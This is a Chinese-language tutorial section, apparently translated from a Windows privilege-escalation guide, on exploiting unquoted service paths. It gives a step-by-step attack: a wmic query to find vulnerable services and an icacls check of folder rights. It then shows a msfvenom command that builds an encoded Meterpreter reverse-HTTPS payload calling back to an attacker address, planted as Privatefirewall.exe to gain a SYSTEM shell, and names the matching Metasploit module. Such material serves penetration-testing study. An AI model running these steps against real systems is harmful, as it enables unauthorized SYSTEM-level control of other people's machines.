## 0x1 不带引号的服务路径

漏洞利用条件：具有目标文件夹的写权限。

这个漏洞存在于二进制服务文件路径中Windows错误解释空格。这些服务通常都是以系统权限运行的，如果我们利用这些服务就可能提权到系统权限。例如如下文件路径：

```
C:\Program Files\Some Folder\Service.exe
```

上面文件路径中的空格，Windows会尝试寻找并执行以空格前单词为名字的程序，操作系统会在文件路径下查找所有可能匹配项直到找到一个匹配为止。例如如下例子，Windows会尝试定位并执行如下的程序：

```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

*Note:这种特性发生在开发人员没有将整个文件路径包含在引号内。将文件路径包含在引号内会降低这个漏洞的威胁。所以这个漏洞被称为“不带引号的服务路径(Unquoted Service Paths.)”*

如果我们在这个文件夹下放置一个精心构造名字的恶意文件，在服务重启后，我们就拥有以系统权限运行的恶意程序了。然而，在放置恶意软件前我们首先要确保我们拥有目标文件夹的权限。那么下面让我们来看下如何发现和利用这个漏洞。

首先，我们可以利用下面一行WMI命令查询（作者：*[@Danial Compton](https://twitter.com/commonexploits)*），列出目标机器上所有没有用引号包含的服务路径：

查看 wmic 帮助信息`wmic /?` 

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

![https://image.3001.net/images/20151129/14487725241584.jpg!small](https://image.3001.net/images/20151129/14487725241584.jpg)

有命中的！PFNet服务的路径没有使用引号包含同时路径中包含空格。这里我们想要利用需要有文件夹的权限。假设我们已经有了设备上的管理员权限，那我们可以使用Windows内建工具icacls查看路径中受影响文件夹的权限：

```
icacls "C:\Program Files (x86)\Privacyware"
```

![https://image.3001.net/images/20151129/14487725595778.jpg!small](https://image.3001.net/images/20151129/14487725595778.jpg)

注意第一行`BUILTIN\Users:(OI)(CI)(M)`：列出了每个用户具有的权限。(M)代表修改权限，这是我们具有的权限，可以进行读、写和删除文件夹中的文件和子文件夹。我们太幸运了！我们现在可以随意的创建和删除名为`Privatefirewall.exe`的恶意软件。那么开始吧！

*Note:如果我们拥有Privacyware文件夹写权限也能完成同样的事情，更多关于Windows权限的资料请参考MSDN的链接：[File and Folder Permissions](https://msdn.microsoft.com/en-us/library/bb727008.aspx)*

当我们利用MSFVenom生成一个可执行文件时，我们希望能够在本地管理员组(windows/adduser)里增加一个账户或者弹回一个系统权限的Meterpreter shell(如下面示例)。当然也可以进行其他的操作。

```
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o Privatefirewall.exe
```

![https://image.3001.net/images/20151129/14487725969663.jpg!small](https://image.3001.net/images/20151129/14487725969663.jpg)

现在我们来执行我们的恶意软件，尝试先关闭在开启PFNet服务以弹回我们的shell。我们可以使用内建工具`sc`完成这些：

```
sc stop PFNet
sc start PFNet
```

![https://image.3001.net/images/20151129/14487726268716.jpg!small](https://image.3001.net/images/20151129/14487726268716.jpg)

没用！原来我们只有服务文件夹的操作权限，但是没有操作PFNet服务本身的权限。这种情况下，我们只能等待有人重启目标机器或者重头再来。

当目标机器重启后，Windows定位并重启了我们的恶意软件弹回了一个具有系统权限的Shell。

![https://image.3001.net/images/20151129/14487726765085.jpg!small](https://image.3001.net/images/20151129/14487726765085.jpg)

**Metasploit Module:** `exploit/windows/local/trusted_service_path`

这个模块只需要我们连接到了一个Meterpreter会话即可运行。

![https://image.3001.net/images/20151129/14487727423173.jpg!small](https://image.3001.net/images/20151129/14487727423173.jpg)

这里我们查看源代码发现，这个模块通过正则表达式筛选出没有用引号包含起来的服务并创建一个易受攻击的服务列表，之后尝试针对列表中第一个服务在其文件夹下面放置一个恶意可执行文件，然后重启重启服务并在重启服务后移除之前放置的恶意可执行文件。

*Note：在这个模块代码中我没有看见任何一处在尝试放置可执行文件失败后检测是否拥有目标文件夹权限的代码。这让我有些疑惑…*
